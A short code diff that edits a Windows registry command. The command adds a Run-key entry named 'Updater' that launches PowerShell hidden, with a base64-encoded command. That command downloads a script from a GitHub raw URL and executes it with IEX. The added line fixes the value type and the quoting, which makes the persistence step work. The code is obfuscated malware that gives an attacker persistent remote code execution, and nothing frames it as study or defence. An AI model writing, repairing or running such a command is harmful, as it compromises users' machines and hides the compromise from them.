@@ -1,2 +1,1 @@
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc
-SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBnAGkAdAAtAGQAaQBzAHAAbwBzAGUAMAAxAC8AZABlAHAAbwBzAGkAdAAvAG0AYQBpAG4ALwB1AHMAZQByAHMAKQAKAA== -nop -w hidden" /t REG_DWORD
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater -t REG_SZ /d "\"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBnAGkAdAAtAGQAaQBzAHAAbwBzAGUAMAAxAC8AZABlAHAAbwBzAGkAdAAvAG0AYQBpAG4ALwB1AHMAZQByAHMAKQAKAA== -nop -w hidden\""
